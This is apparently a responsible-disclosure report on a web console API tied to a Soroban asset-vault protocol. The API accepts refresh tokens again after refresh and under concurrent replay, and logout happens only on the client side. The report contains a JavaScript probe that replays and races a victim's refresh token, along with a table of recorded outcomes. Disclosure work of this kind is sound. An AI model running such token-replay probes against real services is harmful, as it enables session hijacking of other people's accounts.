# Source-code-based

Project: Anonymous asset-management vault protocol (AM-01)  
Category: Asset management, vaults and integrations  
Severity: Medium  
Engagement: Independent hunting + responsible disclosure  
Chain: Stellar / Soroban; Web2 findings concern the associated console and API  
Tech stack: Rust 2021, Soroban SDK 22.0.3, WASM, token/strategy vaults, Blend integration; JavaScript/React, Axios, bearer-token API and XDR signing workflows  
Evidence: Historical observation or unsigned simulation, with supporting source/test excerpts  
Remediation: not demonstrated  
Contribution: Research and disclosure case study; exclusive discovery credit is not asserted  
Proof availability: Excerpts and source references; the original harness and dependencies are not distributed.

# Refresh tokens remain reusable after refresh and concurrent replay

## Description

Attacker holding disclosed refresh token → refresh after prior use or concurrently → no one-time rotation/revocation barrier → copied token repeatedly mints USER sessions; client logout does not revoke copy.

Reusable victim USER access for token lifetime; no role elevation or on-chain/signing capability.

### Mechanism step by step

Backend source is unavailable. The server-side acceptance steps below are based on recorded API observations, not an invented implementation or line number. The source excerpt establishes only the client logout behavior.

#### Step 1 — A copied refresh credential survives successful refresh

Possession of a valid victim refresh token is a prerequisite. The original token succeeds again after issuance of a replacement token.

Source: `outputs/web2-full-drain-investigation-2026-10-02/AUTHORIZATION_MATRIX.md:28-29`.

```text
| Refresh lifecycle | Reuse original token after refresh | `200` | **Broken temporal boundary.** No rotation/replay detection. |
| Refresh lifecycle | Two concurrent uses of one refresh token | Both `200` | **Broken temporal boundary.** Stolen token can be replayed concurrently. |
```

#### Step 2 — Concurrent requests are both accepted

The recorded pair both returns HTTP 200, so the token is not consumed atomically on first use.

Source: `work/web2-full-drain-investigation/active-auth-bola.mjs:220-243`.

```javascript
const refreshed = await request("victim-refresh-1", "POST", "/refresh", {
  token: victimRefresh,
});
if (refreshed.status === 200) {
  const oldRefresh = victimRefresh;
  victimAccess = refreshed.body.access_token;
  victimRefresh = refreshed.body.refresh_token;
  await request("victim-old-refresh-reuse", "POST", "/refresh", {
    token: oldRefresh,
  });
  const concurrentToken = victimRefresh;
  const [a, b] = await Promise.all([
    request("victim-refresh-race-a", "POST", "/refresh", {
      token: concurrentToken,
    }),
    request("victim-refresh-race-b", "POST", "/refresh", {
      token: concurrentToken,
    }),
  ]);
  const winner = [a, b].find((r) => r.status === 200);
  if (winner) {
    victimAccess = winner.body.access_token;
    victimRefresh = winner.body.refresh_token;
  }
```

#### Step 3 — Client logout removes local copies without a revocation request

This shipped client function deletes its stored credentials. The captured access-token reuse is a client-logout model in the script, not evidence that the script drove an actual browser logout or invoked a server revocation API.

Source: `work/console-passive-review/evidence/bundle.js:18`, exact substring of the minified line, character offsets 552708–552849 (zero-based).

```javascript
function d_(){localStorage.removeItem(i_.ACCESS_TOKEN),localStorage.removeItem(i_.REFRESH_TOKEN),localStorage.removeItem(i_.USER)}function ute
```

## Proof of concept

A controlled-account probe used disposable production accounts and their own credentials. After a successful refresh, the original refresh token still returned HTTP 200; two concurrent uses of the same token also returned 200. The accompanying logout experiment models client-only logout and reuses a captured access token; it does not invoke a server revocation API or prove that an actual browser logout was driven. The client excerpt establishes local credential deletion. Private backend source is unavailable.

**Proof limits:** Token possession is a prerequisite. No onchain signing capability or role escalation was demonstrated.

The excerpts below preserve historical assertions and recorded outcomes; they are not a fresh execution result.

## Relevant test excerpts

Source: `work/web2-full-drain-investigation/active-auth-bola.mjs:220-247`.

```javascript
const refreshed = await request("victim-refresh-1", "POST", "/refresh", {
  token: victimRefresh,
});
if (refreshed.status === 200) {
  const oldRefresh = victimRefresh;
  victimAccess = refreshed.body.access_token;
  victimRefresh = refreshed.body.refresh_token;
  await request("victim-old-refresh-reuse", "POST", "/refresh", {
    token: oldRefresh,
  });
  const concurrentToken = victimRefresh;
  const [a, b] = await Promise.all([
    request("victim-refresh-race-a", "POST", "/refresh", {
      token: concurrentToken,
    }),
    request("victim-refresh-race-b", "POST", "/refresh", {
      token: concurrentToken,
    }),
  ]);
  const winner = [a, b].find((r) => r.status === 200);
  if (winner) {
    victimAccess = winner.body.access_token;
    victimRefresh = winner.body.refresh_token;
  }
}
await request("victim-after-client-logout", "GET", "/users/me/features", {
  token: victimAccess,
});
```

Recorded outcome:

Source: `outputs/web2-full-drain-investigation-2026-10-02/AUTHORIZATION_MATRIX.md:28-30`.

```text
| Refresh lifecycle | Reuse original token after refresh | `200` | **Broken temporal boundary.** No rotation/replay detection. |
| Refresh lifecycle | Two concurrent uses of one refresh token | Both `200` | **Broken temporal boundary.** Stolen token can be replayed concurrently. |
| Logout | Reused previously captured access token after client-side logout model | `200` | **Session persistence.** Client performs no server revocation call. |
```
